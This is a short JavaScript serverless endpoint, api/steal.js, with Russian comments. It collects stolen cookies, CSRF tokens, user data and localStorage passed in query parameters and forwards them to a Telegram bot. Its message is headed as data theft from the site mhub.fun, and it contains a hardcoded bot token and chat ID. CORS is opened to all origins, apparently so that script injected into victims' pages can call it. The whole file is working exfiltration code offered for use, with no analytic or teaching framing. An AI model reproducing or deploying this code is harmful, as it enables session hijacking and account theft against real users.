// api/steal.js
export default async function handler(req, res) {
  // Разрешаем CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Получаем данные из запроса
  const { cookies, csrf, user, localStorage, url } = req.query;

  // Формируем сообщение для Telegram
  const botToken = "8862863906:AAG08tI1oXDBPwgzxPeAFRTTcI6RdyKyyBo";
  const chatId = "8593964461";
  const message = `🛑 КРАЖА ДАННЫХ mhub.fun 🛑
  URL: ${url || 'Неизвестно'}
  Cookies: ${cookies || 'Нет'}
  CSRF-токен: ${csrf || 'Нет'}
  Пользователь: ${user || 'Нет'}
  LocalStorage: ${localStorage || 'Нет'}`;

  // Отправляем в Telegram
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: message })
  });

  res.status(200).json({ status: 'ok' });
}